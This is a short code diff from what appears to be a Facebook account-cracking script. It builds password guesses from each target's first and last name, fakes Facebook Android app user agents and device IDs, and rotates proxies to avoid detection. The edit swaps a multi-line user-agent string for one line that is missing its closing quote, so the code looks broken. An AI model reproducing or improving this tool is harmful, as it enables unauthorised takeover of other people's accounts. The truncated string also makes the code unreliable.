@@ -483,9 +483,7 @@ def M_file_1(ids,names,passlist):
                                 
                         for pw in passlist:
                                 pas = pw.replace('first', fn.lower()).replace('First', fn).replace('last', ln.lower()).replace('Last', ln).replace('Name', names).replace('name', names.lower())
-                                u1a ="[FBAN/FB4A;FBAV/627.0.0.29.112;FBBV/64021587;FBLC/fr_FR;FBCR/Orange;FBMF/Xiaomi;FBBD/Xiaomi;FBPN/com.facebook.katana;FBDV/14 Pro;FBSV/14;FBCA/arm64-v8a;FBDM/{density=3.2,width=1440,height=3200};]"+"
-[FBAN/FB4A;FBAV/627.0.0.29.112;FBBV/64021587;FBLC/ar_SA;FBCR/STC;FBMF/OnePlus;FBBD/OnePlus;FBPN/com.facebook.katana;FBDV/12;FBSV/14;FBCA/arm64-v8a;FBDM/{density=2.9,width=1440,height=3168};]"+"
-[FBAN/FB4A;FBAV/630.0.0.18.108;FBBV/64518923;FBLC/fr_FR;FBCR/Orange;FBMF/Huawei;FBBD/Huawei;FBPN/com.facebook.katana;FBDV/P60 Art;FBSV/12;FBCA/arm64-v8a;FBDM/{density=2.6,width=1224,height=2700};]"
+                                u1a ="[FBAN/FB4A;FBAV/627.0.0.29.112;FBBV/64021587;FBLC/fr_FR;FBCR/Orange;FBMF/Xiaomi;FBBD/Xiaomi;FBPN/com.facebook.katana;FBDV/14 Pro;FBSV/14;FBCA/arm64-v8a;FBDM/{density=3.2,width=1440,height=3200};
                                 device_id = str(uuid.uuid4())
                                 adid = str(uuid.uuid4())
                                 nip=random.choice(proxsi)
